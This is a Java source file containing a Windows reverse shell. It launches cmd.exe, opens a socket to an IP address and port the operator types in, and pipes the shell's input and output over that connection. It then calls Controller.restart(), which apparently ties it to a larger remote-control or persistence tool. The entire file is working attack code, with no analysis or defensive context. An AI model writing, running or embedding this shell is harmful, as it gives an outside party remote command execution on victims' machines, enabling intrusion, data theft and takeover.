package archive;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.Scanner;

import controller.Controller;

public class WindowsReverseShell {

	public static void windowsReverseShell(int port, String ip) throws Exception {
	    String host=ip;
	    //int port=9999;
	    String cmd="cmd.exe";
	    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
	    Socket s=new Socket(host,port);
	    InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
	    OutputStream po=p.getOutputStream(),so=s.getOutputStream();
	    while(!s.isClosed()) {
	      while(pi.available()>0)
	        so.write(pi.read());
	      while(pe.available()>0)
	        so.write(pe.read());
	      while(si.available()>0)
	        po.write(si.read());
	      so.flush();
	      po.flush();
	      Thread.sleep(50);
	      try {
	        p.exitValue();
	        break;
	      }
	      catch (Exception e){
	      }
	    };
	    p.destroy();
	    s.close();
		Controller.restart();
	  }
	public static void main(String[] args) throws Exception 
	{
	Scanner inputScanner = new Scanner(System.in);
	System.out.println("Please input the listening ip address");
	String ip = inputScanner.nextLine();
	System.out.println("Please input the listening port");
	int port = Integer.parseInt(inputScanner.nextLine());	//int x = Integer.parseInt(input);
	windowsReverseShell(port, ip);
	inputScanner.close();
	}
}

